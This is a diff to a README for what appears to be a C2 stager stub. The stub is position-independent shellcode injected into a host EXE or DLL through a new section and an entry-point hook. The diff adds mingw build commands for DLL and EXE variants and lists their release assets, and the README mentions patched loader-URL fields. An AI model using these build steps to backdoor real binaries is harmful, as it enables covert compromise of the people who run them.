@@ -13,15 +13,26 @@ shellcode. Injected into a host EXE/DLL (new `.c2` section + entry-point hook), 
 
 ## Build
 
+Pick one entry-point mode via a `-D` flag:
+
+- `-DBUILD_FOR_DLL` — the stub is wired in as the host **DLL's** `DllMain`
+  (`hinstDLL` is the image base; the stager thread fires on
+  `DLL_PROCESS_ATTACH`, then the original `DllMain` is resumed).
+- `-DBUILD_FOR_EXE` — the stub replaces the host **EXE's** entry point (no
+  base argument; the base is derived from the PEB at runtime, then the original
+  entry point is resumed).
+
 ```sh
+MODE=dll   # or: exe
+
 x86_64-w64-mingw32-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector \
                 -fno-asynchronous-unwind-tables -fno-unwind-tables \
-                -e _start stub/stub.c -o stub.o
+                -DBUILD_FOR_$(echo $MODE | tr a-z A-Z) -e _start stub/stub.c -o stub.o
 x86_64-w64-mingw32-ld -T stub/stub.ld --entry=_start -o stub.pe stub.o
-x86_64-w64-mingw32-objcopy -O binary stub.pe stub-x64.bin
+x86_64-w64-mingw32-objcopy -O binary stub.pe stub-x64-$MODE.bin
 ```
 
-Requires `gcc-mingw-w64-x86-64`. CI does this automatically — see
+Requires `gcc-mingw-w64-x86-64`. CI builds **both** variants automatically — see
 [.github/workflows/release.yml](.github/workflows/release.yml).
 
 > **x86 (32-bit) target**: PIC shellcode from C is straightforward on x64
@@ -34,7 +45,8 @@ The rolling **`preview`** release publishes:
 
 | Asset | Arch | Notes |
 |-------|------|-------|
-| `stub-x64.bin` | x86_64 | flat PIC shellcode; entry at byte 0 |
+| `stub-x64-dll.bin` | x86_64 | flat PIC shellcode; DLL/`DllMain` entry at byte 0 |
+| `stub-x64-exe.bin` | x86_64 | flat PIC shellcode; EXE entry at byte 0 |
 
 ## Binder-patched fields (ASCII-findable by the shared `LoaderUrlPatcher`)
 
